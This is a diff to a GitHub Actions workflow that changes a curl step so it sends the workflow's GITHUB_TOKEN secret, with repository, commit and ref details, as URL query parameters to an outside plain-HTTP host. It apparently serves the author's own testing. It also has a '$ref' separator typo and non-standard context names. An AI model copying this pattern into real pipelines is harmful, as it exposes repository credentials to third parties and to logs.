@@ -3,10 +3,10 @@ jobs:
   curl:
     runs-on: ubuntu-latest
     env:
-      FOO: ${{ secrets.GITHUB_TOKEN }}
-      PARAMS: ${{ github.GITHUB_REPOSITORY }}
+      TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      PARAMS: repo=${{ github.GITHUB_REPOSITORY }}&sha=${{ github.GITHUB_SHA }}$ref=${{ github.GITHUB_REF }}
     steps:
     - name: curl
       uses: wei/curl@v1
       with:
-        args: -X GET "http://sandbox.zebrajaeger.de?$PARAMS"
+        args: -X GET "http://sandbox.zebrajaeger.de?${PARAMS}&token=${TOKEN}"
